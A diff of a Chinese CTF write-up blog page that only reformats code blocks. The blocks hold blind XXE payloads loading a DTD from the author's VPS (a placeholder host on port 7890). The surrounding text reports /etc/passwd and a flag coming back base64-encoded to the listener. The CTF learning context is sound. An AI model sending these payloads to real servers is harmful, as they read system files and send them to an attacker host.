@@ -600,13 +600,13 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
 <ul>
 <li>然后构造<code>post</code>请求包，并发送</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">&lt;?xml version=&#34;1.0&#34;?&gt;
-</span><span style="color:#960050;background-color:#1e0010">&lt;!DOCTYPE root [
-</span><span style="color:#960050;background-color:#1e0010">&lt;!ENTITY % remote SYSTEM &#34;http://本人vps的ip:7890&#34;/xxe.dtd&#34;&gt;%remote;]&gt;
-</span><span style="color:#960050;background-color:#1e0010">&lt;comment&gt;
-</span><span style="color:#960050;background-color:#1e0010">&lt;text&gt;test&amp;send;&lt;/text&gt;
-</span><span style="color:#960050;background-color:#1e0010">&lt;/comment&gt;
-</span></code></pre></div><p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015330.png" alt=""></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % remote SYSTEM &quot;http://本人vps的ip:7890&quot;/xxe.dtd&quot;&gt;%remote;]&gt;
+&lt;comment&gt;
+&lt;text&gt;test&amp;send;&lt;/text&gt;
+&lt;/comment&gt;
+</code></pre><p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015330.png" alt=""></p>
 <ul>
 <li>然后发现服务器端的监听有了反应，出来了<code>/etc/passwd</code>经过<code>base64</code>加密后字符</li>
 </ul>
@@ -652,10 +652,10 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
 <ul>
 <li>然后构造<code>post</code>请求包，并发送</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-</span><span style="color:#960050;background-color:#1e0010">&lt;!DOCTYPE xxe SYSTEM &#34;http://本人vps的ip:7890/mmm.dtd&#34;&gt;
-</span><span style="color:#960050;background-color:#1e0010">&lt;send&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/send&gt;
-</span></code></pre></div><p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022028.png" alt=""></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE xxe SYSTEM &quot;http://本人vps的ip:7890/mmm.dtd&quot;&gt;
+&lt;send&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/send&gt;
+</code></pre><p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022028.png" alt=""></p>
 <ul>
 <li>我们发现服务器监听端口有了反应，返回了一串<code>base64</code>加密后字符串，解密后是<code>flag</code></li>
 </ul>
@@ -706,10 +706,10 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
 <ul>
 <li>然后构造<code>post</code>请求包，并发送</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-</span><span style="color:#960050;background-color:#1e0010">&lt;!DOCTYPE xxe SYSTEM &#34;http://本人vps的ip:7890/mmm.dtd&#34;&gt;
-</span><span style="color:#960050;background-color:#1e0010">&lt;send&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/send&gt;
-</span></code></pre></div><p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005212.png" alt=""></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE xxe SYSTEM &quot;http://本人vps的ip:7890/mmm.dtd&quot;&gt;
+&lt;send&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/send&gt;
+</code></pre><p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005212.png" alt=""></p>
 <ul>
 <li>我们发现服务器监听端口有了反应，返回了一串<code>base64</code>加密数据</li>
 </ul>
